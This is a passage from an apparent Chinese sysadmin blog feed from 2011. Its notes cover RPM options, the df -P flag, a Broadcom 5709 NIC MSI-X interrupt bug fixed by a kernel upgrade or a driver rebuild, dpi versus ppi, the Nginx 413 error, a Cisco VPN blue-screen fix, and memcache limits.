显示调试信息</p><p>–rcfile ＜rcfile＞ 设置rpmrc文件为 ＜rcfile＞</p><p><strong>七、其它RPM选项</strong></p><p>–rebuilddb 重建RPM资料库</p><p>–initdb 创建一个新的RPM资料库</p><p>–quiet 尽可能的减少输出</p><p>–help 显示帮助文件</p><p>–version 显示RPM的当前版本</p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> rpm </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>df -h不能显示为一行的问题</title>
      <link href="/2011/06/23/the-df-h-cannot-be-displayed-as-a-one-line-problem/"/>
      <url>/2011/06/23/the-df-h-cannot-be-displayed-as-a-one-line-problem/</url>
      <content type="html"><![CDATA[<p> df -h<br>Filesystem            Size  Used Avail Use% Mounted on<br>/dev/cciss/c0d0p1      20G  1.9G   17G  10% /<br>tmpfs                  12G     0   12G   0% /dev/shm<br>/dev/mapper/skylvm-app<br>                      121G   97G   17G  86% /app<br>/dev/mapper/skylvm-app1<br>                      121G   62G   53G  55% /app1<br>/dev/mapper/skylvm-app2<br>                      121G  197M  114G   1% /app2</p><p>当Filesystem 太长时，无法显示为一行，这样给脚本的批量执行带来很大的问题，</p><p>经过看帮忙和多方资料尝试，可以这样解决</p><p>其实加上-P参数就可以，</p><p>df -hP<br>Filesystem            Size  Used Avail Use% Mounted on<br>/dev/cciss/c0d0p1      20G  1.9G   17G  10% /<br>tmpfs                  12G     0   12G   0% /dev/shm<br>/dev/mapper/skylvm-app  121G   97G   17G  86% /app<br>/dev/mapper/skylvm-app1  121G   62G   53G  55% /app1<br>/dev/mapper/skylvm-app2  121G  197M  114G   1% /app2</p><p> -P, –portability<br>              use the POSIX output format</p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>BROADCOM 5709网卡异常down分析与解决</title>
      <link href="/2011/05/23/broadcom-5709-network-card-abnormal-down-analysis-and-resolution/"/>
      <url>/2011/05/23/broadcom-5709-network-card-abnormal-down-analysis-and-resolution/</url>
      <content type="html"><![CDATA[<p>现网上dell和hp都相继的出现网卡异常down，导致服务器中断的问题，现综合各方面信息和对网卡异常的跟踪做分析和处理建议。</p><p>一、      问题分析和总结  </p><p>DELL PE610 是BROADCOM 5709C 的网卡, 对于LINUX 系统下网络I/O大的时候导致的网络不稳定情况,请参考一下REDHAT 公司KB文档 : <a href="https://access.redhat.com/kb/docs/DOC-26837" target="_blank" rel="noopener">https://access.redhat.com/kb/docs/DOC-26837</a> (具体见附件)  [目前需要用户和密码才能访问REDHAT文档资料].</p><p>其中注明了此网卡的bug修复文档<a href="https://rhn.redhat.com/errata/RHSA-2010-0398.html" target="_blank" rel="noopener">https://rhn.redhat.com/errata/RHSA-2010-0398.html</a>。</p><ol><li>网卡的各种中断方式和区别，以及操作系统对中断的选择</li></ol><p>1)         网卡中断方式的发展，INTx,MSI,MSI-X</p><p>操作系统目前可识别三种类型的中断：</p><p>l  传统中断(INTx)－传统或固定中断是指使用早期总线技术的中断。使用这些技术，可通过一个或多个“带外”（即，独立于总线的主线）连线的外部管脚来发送中断信号。较新的总线技术（如 PCI Express）通过带内机制模拟传统中断来维持软件兼容性。主机 OS 将这些模仿中断视为传统中断。</p><p>l  消息告知中断－消息告知中断 (message-signalled interrupt, MSI) 使用带内消息而不是使用管脚，可在主桥 (host bridge) 中确定中断的地址。（有关主桥 (host bridge) 的更多信息，请参见<a href="http://download.oracle.com/docs/cd/E19253-01/819-7057/hwovr-22/index.html" target="_blank" rel="noopener">PCI 局部总线</a>。）MSI 可以将数据与中断消息一起发送。每个 MSI 都不是共享的，这样可以保证指定给某一设备的 MSI 在系统中是唯一的。一个 PCI 函数最多可以请求 32 条 MSI 消息。</p><p>l  扩展消息告知中断－扩展消息告知中断 (Extended message-signalled interrupt, MSI-X) 是 MSI 的增强版本。MSI-X 中断具有以下新增的优点：</p><p>?  支持 2048 条而不是 32 条消息</p><p>?  针对每条消息支持独立的消息地址和消息数据</p><p>?  支持按消息屏蔽</p><p>?  软件分配的向量少于硬件请求的向量时可具有更大灵活性。软件可以在多个 MSI-X 插槽中重用相同的 MSI-X 地址和数据。</p><p>2)         MSI中断方式和MSI-X中断方式的区别</p><p>看Broadcom的网卡手册看到这样一句：</p><p>MSI Version. This is the Message Signaled Interrupts (MSI) version being used. The option MSI corresponds to the PCI 2.2 specification that supports 32 messages and a single MSI address value. The option MSI-X corresponds to the PCI 3.0 specification that supports 2,048 messages and an independent message address for each message.</p><p>总算明白了，实际应用场景中，MSI方式的中断对多核cpu的利用情况不佳，网卡中断全部落在某一个cpu上，即使设置cpu affinity也没有作用，而MSI-X中断方式可以自动在多个cpu上分担中断。</p><p>3)         Linux中对网卡中断方式的选择</p><p>By default, the driver enables MSI if it is supported by the kernel. It runs an interrupt test during initialization to determine if MSI is working. If the test passes, the driver enables MSI. Otherwise, it uses legacy INTx mode.</p><p>可以看出，linux中只要网卡支持MSI中断方式，默认都会开启,开机时会探测是否支持MSI，支持就启用，不支持才会使用INTx模式</p><p>4)         如何查看系统中网卡工作的中断方式</p><p>cat /proc/interrupts有类似如下信息，就可以看出网卡的中断方式</p><p>11265195     211176       PCI-MSI-X  eth0-0</p><p>54549       7408668       PCI-MSI-X  eth0-1</p><p>5)         如何查看网卡的驱动版本信息</p><p>ethtool -i eth0</p><p>driver: bnx2</p><p>version: 1.9.3</p><p>firmware-version: 5.2.2 NCSI 2.0.6</p><p>bus-info: 0000:10:00.0</p><pre><code>modinfo bnx2</code></pre><p>filename:       /lib/modules/2.6.18-164.el5PAE/kernel/drivers/net/bnx2.ko</p><p>version:        1.9.3</p><p>license:        GPL</p><p>description:    Broadcom NetXtreme II BCM5706/5708/5709/5716 Driver</p><p>author:         Michael Chan <a href="mailto:&#109;&#99;&#104;&#97;&#x6e;&#64;&#x62;&#x72;&#x6f;&#x61;&#x64;&#99;&#111;&#109;&#46;&#99;&#111;&#109;" target="_blank" rel="noopener">&#109;&#99;&#104;&#97;&#x6e;&#64;&#x62;&#x72;&#x6f;&#x61;&#x64;&#99;&#111;&#109;&#46;&#99;&#111;&#109;</a></p><p>srcversion:     D151EAED8C1037CA480DE9A</p><ol start="2"><li>根据bug文档，网卡中断问题其实于2010-05-06就已经通过升级kernel(升级到kernel-2.6.18-194.3.1以上版本)完成修复了。并且还修复了一个除MSI-X以外的另一个问题。</li></ol><p>看一下修得的日志，以下引用redhat修复bug文档(部分)。</p><p>Important: kernel security and bug fix update</p><p>Advisory:</p><p>RHSA-2010:0398-1</p><p>Type:</p><p>Security Advisory</p><p>Severity:</p><p>Important</p><p>Issued on:</p><p>2010-05-06</p><p>Last updated on:</p><p>2010-05-06</p><p>Affected Products:</p><p>Red Hat Enterprise Linux (v. 5 server)</p><p>Red Hat Enterprise Linux Desktop (v. 5 client)</p><p>OVAL:</p><p>com.redhat.rhsa-20100398.xml</p><p>CVEs (cve.mitre.org):</p><p>CVE-2010-0307</p><p>CVE-2010-0410</p><p>CVE-2010-0730</p><p>CVE-2010-1085</p><p>CVE-2010-1086</p><p>Details</p><p>Updated kernel packages that fix multiple security issues and several bugs</p><p>are now available for Red Hat Enterprise Linux 5.</p><p>The Red Hat Security Response Team has rated this update as having</p><p>important security impact. Common Vulnerability Scoring System (CVSS) base</p><p>scores, which give detailed severity ratings, are available for each</p><p>vulnerability from the CVE links in the References section.</p><p>The kernel packages contain the Linux kernel, the core of any Linux</p><p>operating system.</p><p>。。。。</p><p>This update fixes the following security issues:</p><p>* in certain circumstances, under heavy load, certain network interface</p><p>cards using the bnx2 driver and configured to use MSI-X, could stop</p><p>processing interrupts and then network connectivity would cease.</p><p>(BZ#587799)</p><p>* cnic parts resets could cause a deadlock when the bnx2 device was</p><p>enslaved in a bonding device and that device had an associated VLAN.</p><p>(BZ#581148)</p><p>。。。。。。</p><p>Users should upgrade to these updated packages, which contain backported</p><p>patches to correct these issues. The system must be rebooted for this</p><p>update to take effect.</p><ol start="3"><li>以下引用Broadcom Corporation NetXtreme II BCM5709 Gigabit Ethernet网卡驱动程序作者于2010-04-27的修复补丁文档来查看具体修改了驱动中的哪一部分。</li></ol><p>bnx2: Fix lost MSI-X problem on 5709 NICs</p><p>Submitter</p><p>Michael Chan（此网卡驱动的作者，modinfo bnx2中可以看得到）</p><p>Date</p><p>2010-04-27 21:28:09</p><p>Message ID</p><p><a href="mailto:&#x31;&#50;&#x37;&#x32;&#52;&#48;&#51;&#54;&#57;&#x31;&#45;&#x32;&#x39;&#x33;&#52;&#45;&#49;&#x2d;&#x67;&#x69;&#116;&#45;&#x73;&#101;&#x6e;&#100;&#x2d;&#x65;&#x6d;&#x61;&#x69;&#x6c;&#x2d;&#x6d;&#99;&#x68;&#97;&#x6e;&#x40;&#98;&#114;&#111;&#x61;&#100;&#x63;&#111;&#x6d;&#46;&#x63;&#111;&#x6d;" target="_blank" rel="noopener">&#x31;&#50;&#x37;&#x32;&#52;&#48;&#51;&#54;&#57;&#x31;&#45;&#x32;&#x39;&#x33;&#52;&#45;&#49;&#x2d;&#x67;&#x69;&#116;&#45;&#x73;&#101;&#x6e;&#100;&#x2d;&#x65;&#x6d;&#x61;&#x69;&#x6c;&#x2d;&#x6d;&#99;&#x68;&#97;&#x6e;&#x40;&#98;&#114;&#111;&#x61;&#100;&#x63;&#111;&#x6d;&#46;&#x63;&#111;&#x6d;</a></p><p>Comments</p><p>Michael Chan - 2010-04-27 21:28:09</p><p>It has been reported that under certain heavy traffic conditions in MSI-X</p><p>mode, the driver can lose an MSI-X vector causing all packets in the</p><p>associated rx/tx ring pair to be dropped.  The problem is caused by</p><p>the chip dropping the write to unmask the MSI-X vector by the kernel</p><p>(when migrating the IRQ for example).</p><p>This can be prevented by increasing the GRC timeout value for these</p><p>register read and write operations.</p><p>Thanks to Dell for helping us debug this problem.</p><p>Signed-off-by: Michael Chan <a href="mailto:&#109;&#x63;&#x68;&#97;&#110;&#64;&#98;&#x72;&#x6f;&#97;&#100;&#99;&#x6f;&#109;&#46;&#99;&#x6f;&#x6d;" target="_blank" rel="noopener">&#109;&#x63;&#x68;&#97;&#110;&#64;&#98;&#x72;&#x6f;&#97;&#100;&#99;&#x6f;&#109;&#46;&#99;&#x6f;&#x6d;</a></p><p>---</p><p> drivers/net/bnx2.c |    6 +++++-</p><p> 1 files changed, 5 insertions(+), 1 deletions(-)</p><p>David Miller - 2010-04-27 21:38:25</p><p>From: “Michael Chan” <a href="mailto:&#109;&#x63;&#x68;&#97;&#x6e;&#64;&#98;&#x72;&#x6f;&#x61;&#100;&#x63;&#111;&#x6d;&#x2e;&#x63;&#x6f;&#x6d;" target="_blank" rel="noopener">&#109;&#x63;&#x68;&#97;&#x6e;&#64;&#98;&#x72;&#x6f;&#x61;&#100;&#x63;&#111;&#x6d;&#x2e;&#x63;&#x6f;&#x6d;</a></p><p>Date: Tue, 27 Apr 2010 14:28:09 -0700</p><p>> It has been reported that under certain heavy traffic conditions in MSI-X</p><p>> mode, the driver can lose an MSI-X vector causing all packets in the</p><p>> associated rx/tx ring pair to be dropped.  The problem is caused by</p><p>> the chip dropping the write to unmask the MSI-X vector by the kernel</p><p>> (when migrating the IRQ for example).</p><blockquote></blockquote><p>> This can be prevented by increasing the GRC timeout value for these</p><p>> register read and write operations.</p><blockquote></blockquote><p>> Thanks to Dell for helping us debug this problem.</p><blockquote></blockquote><p>> Signed-off-by: Michael Chan <a href="mailto:&#x6d;&#x63;&#104;&#97;&#110;&#x40;&#98;&#114;&#111;&#x61;&#x64;&#99;&#111;&#x6d;&#x2e;&#99;&#x6f;&#x6d;" target="_blank" rel="noopener">&#x6d;&#x63;&#104;&#97;&#110;&#x40;&#98;&#114;&#111;&#x61;&#x64;&#99;&#111;&#x6d;&#x2e;&#99;&#x6f;&#x6d;</a></p><p>Applied to net-2.6</p><p>–</p><p>To unsubscribe from this list: send the line “unsubscribe netdev” in</p><p>the body of a message to <a href="mailto:majordomo@vger.kernel.org" target="_blank" rel="noopener">majordomo@vger.kernel.org</a></p><p>More majordomo info at  <a href="http://vger.kernel.org/majordomo-info.html" target="_blank" rel="noopener">http://vger.kernel.org/majordomo-info.html</a></p><p>Patch</p><p>diff –git a/drivers/net/bnx2.c b/drivers/net/bnx2.c</p><p>index a257bab..4c1e51e 100644</p><p>--- a/drivers/net/bnx2.c</p><p>+++ b/drivers/net/bnx2.c</p><p>@@ -4759,8 +4759,12 @@  bnx2_reset_chip(struct bnx2 *bp, u32 reset_code)</p><pre><code>        rc = bnx2\_alloc\_bad_rbuf(bp);}</code></pre><ul><li>if (bp-&gt;flags &amp; BNX2_FLAG_USING_MSIX)</li></ul><ul><li><p>if (bp-&gt;flags &amp; BNX2_FLAG_USING_MSIX) {</p><pre><code>bnx2\_setup\_msix_tbl(bp);</code></pre></li></ul><p>+                /* Prevent MSIX table reads and write from timing out */</p><ul><li><p>REG_WR(bp, BNX2_MISC_ECO_HW_CTL,</p></li><li><p>BNX2_MISC_ECO_HW_CTL_LARGE_GRC_TMOUT_EN);</p></li><li><p>}</p><p> return rc;</p><p>}</p></li></ul><ol start="4"><li><p>经过对redhat5.4的kernel中的网卡驱动部分源码进行确认，确实没有打上此补丁。</p></li><li><p>现网上之前采用升级到2.0.18c的网卡驱动中，确认驱动源码中也没有打上些补丁，所以现网上把网卡升级到2.0.18c也是无效的。</p></li><li><p>现redhat对rhel5系列发布的最新修复bug后的kernel为kernel-PAE-2.6.18-194.32.1.el5.i686.rpm，对此kernel的源码进行确认，确认已经打上了补丁。</p></li><li><p>网卡Broadcom官网上对BCM5709系列网卡的驱动已经更新到bnx2-2.0.23b，通过源码确认，Broadcom官网也已经把此补丁更新到发布的驱动中。</p></li></ol><p>二、      现网处理建议  </p><ol><li><p>不建议通过关闭msi中断方式解决，原因请看第一部分中的网卡中断方式的区别，即关闭后，网卡中断全部落在某一个cpu上。如果真想关闭msi中断方式，在加载模块时加上disable_msi=1的参数，并加进系统配置文件。</p></li><li><p>如果条件请允许(因为升级kernel要重启机器才能生效)，建议只升级kernel来解决网卡异常问题，因为升级kernel在解决网卡异常问题时，同时也解决了其中很多的系统bug。而且因为只升级kernel，所以对现网的环境如java,python,gcc等都不会发生改变，请不要直接使用centos源，把系统完全升级，那样的话，系统中python等环境会全部改变，可能会对现网的业务产生冲击。建议使用运维提供的yum升级源(特为此次升级kernel做的内网升级源)进行升级。</p></li><li><p>如果不具备升级kernel的条件，可以使用编译网卡Broadcom官网发布的最新的驱动将网卡的驱动更新到bnx2-2.0.23b。</p></li></ol><p>三、      现网处理具体步骤  </p><ol><li><p>关闭msi中断方式，具体参数配置请参考文档中的附件DOC-26837，但不建议关闭。</p></li><li><p>使用yum升级kernel</p></li></ol><p>1)         运维会提供现网上主要使用的几个操作系统版本的yum源，把运维提供的repo源文件放到/etc/yum.repos.d/下。</p><p>如cp rhel-server-5.4-i386.repo /etc/yum.repos.d/</p><p>2)         建议把原来/etc/yum.repos.d/下的其中文件备份并移除。</p><p>3)         Yum clean all</p><p>yum update kernel</p><p>Loaded plugins: fastestmirror</p><p>Determining fastest mirrors</p><p>Cluster                                       | 1.1 kB     00:00    </p><p>ClusterStorage                                 | 1.1 kB     00:00    </p><p>Server                                        | 1.1 kB     00:00    </p><p>Server/primary                                 | 818 kB     00:00    </p><p>Server                                                 2293/2293</p><p>VT                                            | 1.1 kB     00:00    </p><p>Setting up Update Process</p><p>Resolving Dependencies</p><p>–> Running transaction check</p><p>—> Package kernel-PAE.i686 0:2.6.18-194.32.1.el5 set to be installed</p><p>–> Finished Dependency Resolution</p><p>Dependencies Resolved</p><p>===========================================================================</p><p> Package        Arch      Version          Repository          Size</p><p>===========================================================================</p><p>Installing:</p><p> kernel-PAE     i686      2.6.18-194.32.1.el5       Server             17 M</p><p>Transaction Summary</p><p>===========================================================================</p><p>Install      1 Package(s)        </p><p>Update       0 Package(s)        </p><p>Remove       0 Package(s)        </p><p>Total download size: 17 M</p><p>Is this ok [y/N]: y</p><p>Downloading Packages:</p><p>kernel-PAE-2.6.18-194.32.1.el5.i686.rpm                   |  17 MB     00:00    </p><p>Running rpm_check_debug</p><p>Running Transaction Test</p><p>Finished Transaction Test</p><p>Transaction Test Succeeded</p><p>Running Transaction</p><p>  Installing     : kernel-PAE                           1/1</p><p>Installed:</p><p>  kernel-PAE.i686 0:2.6.18-194.32.1.el5                                                                                            </p><p>Complete!</p><p>4)         cat /boot/grub/grub.conf</p><p>default=0</p><p>timeout=5</p><p>splashimage=(hd0,0)/boot/grub/splash.xpm.gz</p><p>hiddenmenu</p><p>title CentOS (2.6.18-194.32.1.el5PAE)</p><pre><code>root (hd0,0)kernel /boot/vmlinuz-2.6.18-194.32.1.el5PAE ro root=LABEL=/1 rhgb quietinitrd /boot/initrd-2.6.18-194.32.1.el5PAE.img</code></pre><p>title CentOS (2.6.18-164.el5PAE)</p><pre><code>root (hd0,0)kernel /boot/vmlinuz-2.6.18-164.el5PAE ro root=LABEL=/1 rhgb quietinitrd /boot/initrd-2.6.18-164.el5PAE.img</code></pre><p>注意查看default是否是配置成最新内核的titile</p><ol start="3"><li>请下载Broadcom官网发布的最新的驱动</li></ol><p>1)         Wget –c <a href="http://zh-cn.broadcom.com/docs/driver_download/NXII/linux-6.2.23.zip" target="_blank" rel="noopener">http://zh-cn.broadcom.com/docs/driver_download/NXII/linux-6.2.23.zip</a></p><p>2)         编译安装</p><p>A.        建议使用src包安装</p><p>解压并找到linux-6.2.23.zip\Server\Linux\Driver\netxtreme2-6.2.23-1.src.rpm</p><p>rpm -ivh netxtreme2-<version>.src.rpm</version></p><p>cd /usr/src/redhat</p><pre><code>rpmbuild -bb SPECS/netxtreme2.spec  编译好的RPM包就在RPMS/&lt;arch&gt;/netxtreme2-&lt;version&gt;.&lt;arch&gt;.rpm   找到自己的版本进行安装如</code></pre><p>rpm -ivh RPMS/i386/netxtreme2-<version>.i386.rpm</version></p><p>B.        使用tar.gz包进行编译安装</p><p>tar xvzf netxtreme2-<version>.tar.gz</version></p><p>make</p><p>make install</p><p>3)         重装加载网卡模块</p><p>rmmod bnx2;modprobe bnx2</p><p>注意执行模块重载会中断几秒钟，正常的话，所有的连接都不会中断。</p><p>注意事项：</p><ol><li><p>建议使用升级kernel方式解决。</p></li><li><p>不建议关闭msi中断方式。</p></li><li><p>如果没有使用官网最新的驱动程序进行编译，只能使用源码编译的方式，而且在编译前要先给bnx2.c打path后，再进行编译安装。</p></li></ol>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 5709网卡异常down分析与解决 </tag>
            
            <tag> broadcom </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>dpi和ppi的区别</title>
      <link href="/2011/04/02/the-difference-between-dpi-and-ppi/"/>
      <url>/2011/04/02/the-difference-between-dpi-and-ppi/</url>
      <content type="html"><![CDATA[<p>有些人弄混了ppi和dpi的概念！<br>ppi才是是图像分辨率的单位，即pixels per inch，图像ppi值越高，画面的细节就越丰富，因为单位面积的像素数量更多，数码相机出来的图片都是72ppi的分辨率，默认出来就是这么多，拿到Photoshop里面改成300ppi，我认为没有什么实际意义，而且增大了图像的体积，除非你用的是tiff格式，不在乎。<br>dpi是针对于输出设备而言的，指输出分辨率，dots per inch，一般的激光打印机的输出分辨率是300dpi-600dpi，印刷的照排机达到1200dpi-2400dpi。  </p><p>ppi和dpi确实是两个概念，但是有些事情是约定成俗的，图片的ppi无法反映这张图片能在冲印店得到的冲印质量，不如你去店里试试看，你问问操作员你的图片是72ppi会得到什么样的冲印质量，多数操作员会一头雾水。<br>在冲印店里我们只用dpi，因为我们拿去的图片必定是为了输出成照片，对于操作人员，他要知道的就是你的图片像素和你所需要印制的尺寸，这两个要素构成了dpi，所以尽管不规范，对于需要冲印的图片我们只有用dpi的大小来沟通。<br>“拿到Photoshop里面改成300ppi，我认为没有什么实际意义，而且增大了图像的体积”这样的改法是固定图像大小（尺寸）下对ppi的修改，它导致了图片像素不真实的扩大，因此导致图片体积的扩大而且图像质量并无改善（多出来的像素都是差值计算出来的），正确的办法是，先按照你所需要扩印的尺寸的比例裁切你的图片，然后固定图片的像素（把“重定义图片的像素”前面的勾去掉）和比例，在“文档大小”里把宽度和高度调整到你所想要的扩印尺寸一致，这时候出来的ppi就是你的图片在这个冲印尺寸下可以得到的dpi，若低于120说明印出来的效果会比较差，120~200说明效果还可以，300是最好的效果，若大于300，先把“重定义图片的像素”前面勾上再修改ppi到300或更低。<br>（注：300dpi是冲印机的极限，大于300ppi的图片将对照片清晰度无任何改善，实际上250就够了，就算你输入大于300ppi的图片文件到冲印机，冲印机也会先把图片计算成300ppi的再进行扩印，另外别小看冲印机的300dpi，冲印机300dpi的照片素质是任何打印设备所无法逾越的）</p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> dpi和ppi的区别 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Nginx出现“413 Request Entity Too Large”错误解决方法</title>
      <link href="/2011/03/25/nginx-has-a-413-request-entity-too-large-error-solution/"/>
      <url>/2011/03/25/nginx-has-a-413-request-entity-too-large-error-solution/</url>
      <content type="html"><![CDATA[<p>今天使用Wordpress的flash版文件上传功能的时候，总是提示接口错误，很是郁闷。换小文件发现没有问题，所以问题肯定出现在文件大小上，找了半天没有发现wordpress有限制上传文件大小的地方。</p><p>切换到传统文件上传界面，重新上传一个大文件，这回出来错误提示了，413 Request Entity Too Large，google了一下，发现是Nginx的错误提示。</p><p>解决方法：打开nginx主配置文件nginx.conf，找到http{}段，添加<br>client_max_body_size 20m;<br>Centos下 vi /usr/local/nginx/conf/nginx.conf</p><p>重启NGINX<br>kill -HUP `cat /usr/local/nginx/nginx.pid `<br>恢复正常</p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 413 </tag>
            
            <tag> entity </tag>
            
            <tag> large </tag>
            
            <tag> nginx出现 </tag>
            
            <tag> request </tag>
            
            <tag> too </tag>
            
            <tag> 错误解决方法 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>如何查看RPM包的更新日志Changelog</title>
      <link href="/2011/03/25/how-to-view-the-update-log-of-rpm-package-changelog/"/>
      <url>/2011/03/25/how-to-view-the-update-log-of-rpm-package-changelog/</url>
      <content type="html"><![CDATA[<p>RPM安装包必须存在，才能执行以下命令。<br>命令： rpm -qpi &lt;rpm包名&gt;  –changelog |more<br># rpm -qi kernel-PAE-2.6.18-194.32.1.el5 –changelog |more<br>Name        : kernel-PAE                   Relocations: (not relocatable)<br>Version     : 2.6.18                            Vendor: CentOS<br>Release     : 194.32.1.el5                  Build Date: Thu 06 Jan 2011 10:41:36 AM CST<br>Install Date: Thu 24 Mar 2011 04:57:37 PM CST      Build Host: builder10.centos.org<br>Group       : System Environment/Kernel     Source RPM: kernel-2.6.18-194.32.1.el5.src.rpm<br>Size        : 46645007                         License: GPLv2<br>Signature   : DSA/SHA1, Thu 06 Jan 2011 08:16:00 PM CST, Key ID a8a447dce8562897<br>URL         : <a href="http://www.kernel.org/" target="_blank" rel="noopener">http://www.kernel.org/</a><br>Summary     : The Linux kernel compiled for PAE capable machines.<br>Description :<br>This package includes a version of the Linux kernel with support for up to<br>64GB of high memory. It requires a CPU with Physical Address Extensions (PAE).<br>The non-PAE kernel can only address up to 4GB of memory.<br>Install the kernel-PAE package if your machine has more than 4GB of memory.<br>* Wed Jan 05 2011 Karanbir Singh &lt;<a href="mailto:kbsingh@centos.org" target="_blank" rel="noopener">kbsingh@centos.org</a>> [2.6.18-194.32.1.el5.centos]<br>* Roll in CentOS Branding</p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 如何查看rpm包的更新日志changelog </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>comodo与cisco vpn蓝屏解决记（转）</title>
      <link href="/2011/03/17/comodo-and-cisco-vpn-blue-screen-resolution-rotation/"/>
      <url>/2011/03/17/comodo-and-cisco-vpn-blue-screen-resolution-rotation/</url>
      <content type="html"><![CDATA[<p>转<a href="http://hi.baidu.com/zylyly/blog/item/20f814603dcde7d78cb10d53.html" target="_blank" rel="noopener">http://hi.baidu.com/zylyly/blog/item/20f814603dcde7d78cb10d53.html</a></p><p>在家通过VPN连单位网络，是经常的事情，可因种种未知原来，使得每次VPN连接都非常痛苦。从今天开始，终于可告别此痛苦了，为避免更多的朋友经历同样的痛苦，在下面附上解决方案及一些”废话“。<br>-----------------------------------------------<br>很久以前，发现VPN连不上，于是折腾了系统中的各种软件，最后发现与卡巴斯基有关，于是弃卡巴不用。转用“小红伞”。<br>再次很久以前，发觉有必要安装防火墙了，经多次试用，最后选择了“风云”，平时一切使用均正常。可多次出现了蓝屏。。。经多次的蓝屏，发觉都是在使用完cisco vpn后，再连接互联网时发生蓝屏。于是归因于“风云”的不兼容，准备弃之不用，但经试用多种不同的防火墙软件，发觉还是“风云”好用，于是重新装回它，忍受每次vpn后蓝屏的痛苦。  </p><p>前几个月前，装 风云2009后，发觉CISCO vpn可连上，但不能访问单位的任何资源，卸载风云2009后，vpn又可正常使用，且vpn后不会蓝屏。于是又归因于”风云“。。。  </p><p>昨晚（终于步入正题），需连接vpn，但不能连上，很火，于是下定决心找到”风云“的替代者，昨晚反复试用了”op“”comodo“”风云“到凌晨3点，测试结果是：”comodo、风云“均出现蓝屏，op与vpn可正常使用，但op的英文界面的确有点难受。。。  </p><p>今早起床后，继续折腾防火墙，经昨晚试用，发现comodo杀毒挺强的，杀毒与防火墙一体化，觉定用它暂代替”风云+小红伞“。准备忍受与vpn的蓝屏。。。  </p><p>可刚才一想，不对呀，那么多防火墙均与cisco vpn出现蓝屏，怎么可能问题都是防火墙的呢？为什么不是cisco vpn呢？是呀，于是又google一下，”根据WinDbg的调试，是由于Cisco VPN安装时自带的ZA的防火墙与XP系统防火墙冲突，导致显卡驱动停止响应。Google后发现的解决方案时从系统目录下删除vsdatant.sys和vsdata.dll两个文件“。赶忙删除vsdatant.sys和vsdata.dll，一试vpn，可正常访问单位资源，断开vpn后，浏览器上网，没有出现”风云“似蓝屏。耶！终于解决了vpn与防火墙的的痛苦。感谢万能的google、感谢万能的网友。</p>]]></content>
      
      <categories>
          
          <category> windows </category>
          
      </categories>
      
      
        <tags>
            
            <tag> comodo与cisco </tag>
            
            <tag> vpn蓝屏解决记 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>memcache的限制</title>
      <link href="/2011/03/17/the-limitation-of-memcache/"/>
      <url>/2011/03/17/the-limitation-of-memcache/</url>
      <content type="html"><![CDATA[<p>memcache单个缓存值限制为1M(1000000bytes)，超过这个限制的时候会出如下错误。</p><blockquote><p>ValueError: Values may not be more than 1000000 bytes in length; received 2000000 bytes</p></blockquote><p>memcache的keys限制为250 bytes，超过这个长度会报错。</p><blockquote><p>ValueError: Keys may not be more than 250 bytes in length, received 14670 bytes</p></blockquote><p>memcache的时间设置没限制，但服务器会自动清理缓存，官方好像说过最长为1个月时间(3600*24*30)。</p><p>  memcached的简单限制就是键（key）和item的限制。最大键长为250个字符。可以接受的储存数据不能超过1MB，因为这是典型slab 的最大值。这里我们可以突破对key长度的限制。<br>问题解决：<br>修改memcached源文件。在memcached.h中定义key的长度，其代码为：  </p><p>#define KEY_MAX_LENGTH 250<br>更换为所需要的长度，比如：1024  </p><p>#define KEY_MAX_LENGTH 1024  </p><p>但不建议增大key，key大 value小，效率就低了</p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> memcache的限制 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>hal-set-property修改lshal信息</title>
      <link href="/2011/03/09/hal-set-property-modifies-lshal-information/"/>
      <url>/2011/03/09/hal-set-property-modifies-lshal-information/</url>
      <content type="html"><![CDATA[<p>对于使用gnome-mount或者hal的朋友来说，当分区被挂载后，会在桌面上显示”多少G的设备“这样的东西，是不是看着眼烦，现在介绍一种比较简单的方法来修改hal的参数<br>首先，使用hal-device,来查看自动挂载信息，例如hal-device |less 然后查找sda5<br>代码:  </p><p>代码</p><p>8: udi = ‘/org/freedesktop/Hal/devices/volume_uuid_EE0454B90454868D’<br>  block.minor = 5  (0x5)  (int)<br>  org.freedesktop.Hal.Device.Volume.method_names = { ‘Mount’, ‘Unmount’, ‘Eject’<br>} (string list)<br>  volume.ignore = false  (bool)<br>  volume.label = ‘winE’  (string)<br>  info.capabilities = { ‘volume’, ‘block’ } (string list)<br>  volume.is_partition = true  (bool)<br>  volume.mount_point = ‘/media/winE’  (string)<br>  info.category = ‘volume’  (string)<br>  info.product = ‘Volume (ntfs)’  (string)<br>  volume.is_disc = false  (bool)<br>  volume.is_mounted = true  (bool)<br>  block.is_volume = true  (bool)<br>  volume.linux.is_device_mapper = false  (bool)<br>  block.storage_device = ‘/org/freedesktop/Hal/devices/storage_serial_SATA_ST916<br>0821AS_5MA9TVM1’  (string)<br>  info.parent = ‘/org/freedesktop/Hal/devices/storage_serial_SATA_ST9160821AS_5M<br>A9TVM1’  (string)<br>  volume.block_size = 512  (0x200)  (int)<br>  volume.partition.number = 5  (0x5)  (int)<br>  volume.num_blocks = 182305557  (0xaddc315)  (int)  </p><p>volume.fsversion = ‘3.1’  (string)<br>  block.device = ‘/dev/sda5’  (string)<br>  volume.uuid = ‘EE0454B90454868D’  (string)<br>  volume.partition.media_size = 160041885696  (0x25433d6000)  (uint64)<br>  volume.fsusage = ‘filesystem’  (string)<br>  volume.is_mounted_read_only = false  (bool)<br>  